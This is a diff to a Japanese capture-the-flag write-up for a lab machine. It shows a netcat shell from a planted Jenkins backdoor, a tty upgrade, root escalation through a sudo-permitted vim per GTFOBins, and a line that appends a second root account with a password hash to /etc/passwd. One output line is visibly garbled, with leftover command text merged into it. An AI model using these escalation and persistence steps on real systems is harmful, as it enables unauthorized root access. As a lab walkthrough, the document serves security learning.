@@ -418,19 +418,48 @@ New Item -> Freestyle project で、backdoorをしかけます。
 
 <br />
 
-Raw Shellの中でなぜか tty を設定しようとすると接続が切れてしまうので、raw shellで頑張ることにしました。
+Raw Shellの中、Python3と/bin/ashを使ってterminalを設定します。(ちなみに、/bin/bashはありませんでした。)
 
 <pre>
 $ nc 192.168.0.213 4444
 id
 uid=100(jenkins) gid=101(jenkins) groups=101(jenkins),101(jenkins)
 
+sudo -l
+User jenkins may run the following commands on lockedout:
+    (root) NOPASSWD: /usr/bin/vim
+
 which python
 
 which python3
 /usr/bin/python3
 
-python3 -c import pty; pty.spawn("/bin/sh");  <== ここで切れる。。
+python3 -c 'import pty; pty.spawn("/bin/ash");'
+
+~/workspace/RCTS_CTF $ ^[[24;24R
+
+export TERM=xterm
+
+（ここでCTRL-Z）
+
+stty raw -echo
+fg
+reset
+
+</pre>
+
+
+<br />
+
+GTFOBins（[https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/)）に従って、権限昇格してみます。
+
+<pre>
+sudo /usr/bin/vim -c ':!/bin/ash'
+
+:!/bin/ash
+/var/lib/jenkins/workspace/RCTS_CTF #
+id
+uid=0(root2) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)python3 -c import pty; pty.spawn("/bin/sh"); 
 
 $
 
@@ -438,31 +467,20 @@ $
 
 
 <br />
-
-root権限で、vimが起動できるようになってます。
-<pre>
-$ nc 192.168.0.213 4444
-sudo -l
-User jenkins may run the following commands on lockedout:
-    (root) NOPASSWD: /usr/bin/vim
-
-</pre>
-
-<br />
-GTFOBins（[https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/)）に従っていろいろやってみたんですが、これはうまくいかなかったです。
-
-<br />
-まず、/etc/passwd, /etc/shadow を取って John The Ripperによるroot passwordのcrackを試しました。が、これは時間がかかりそうだったので諦めました。
-
-<br />
-次に、/etc/passwd に別のrootユーザを追加するやり方です。Raw shellでファイル編集が難しかったので、以下のようにvimの引数を使ってファイルに書き込みを行いました。
+その他、/etc/passwd に別のrootユーザを追加するやり方でもroot権限は取れます。なお、Raw shellでうまくファイル編集ができない場合は、以下のようにvimの引数を使う方法もあります。そうすると編集が終わった状態で立ち上がります。
 
 <pre>
 sudo /usr/bin/vim /etc/passwd +"a|root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/sh"
+
+su root2
+Password:
+# id
+uid=0(root2) gid=0(root) groups=0(root)
+
 </pre>
 
 <br />
-これでroot2としてログインできると思ったんですが、どうもログインできないので、SSHの設定どうなっているんだと思って sshd_config を確認することにしました。
+これでroot2としてSSHログインもできると思ったんですが、どうもログインできないので、SSHの設定どうなっているんだと思って sshd_config を確認することにしました。
 
 <pre>
 cat /etc/ssh/sshd_config
@@ -482,35 +500,6 @@ cat /etc/ssh/sshd_config
 <br />
 
 Flag: `flag{r00t_l0gin_1s_1ns3cur3}`
-
-<br /><br />
-ついでに、/etc/passwd を書き換えたのと同様に、/etc/ssh/sshd_config も書き換えちゃいます。
-
-<pre>
-/usr/bin/vim /etc/ssh/sshd_config +"a|PermitRootLogin yes"
-</pre>
-
-<br />
-
-この後、VirtualBoxにて強制マシン再起動。これで、root2でログインできるようになります。
-
-<pre>
-$ ssh root2@192.168.0.213
-root2@192.168.0.213's password:
-Welcome to Alpine!
-
-The Alpine Wiki contains a large amount of how-to guides and general
-information about administrating Alpine systems.
-See <http://wiki.alpinelinux.org/>.
-
-You can setup the system with the command: setup-alpine
-
-You may change this message by editing /etc/motd.
-
-lockedout:~# id
-uid=0(root2) gid=0(root) groups=0(root)
-lockedout:~#
-</pre>
 
 
 
@@ -574,6 +563,11 @@ lockedout:/# grep flag /root/.viminfo
 
 Flag: `flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}`
 
+
+<br />
+
+参考までに、以下はLinuxで確認した方がいいファイルのリストです。(~/.viminfo 書かれてます)<br />
+[https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/](https://gracefulsecurity.com/path-traversal-cheat-sheet-linux/)
 
 
 <br /><br />
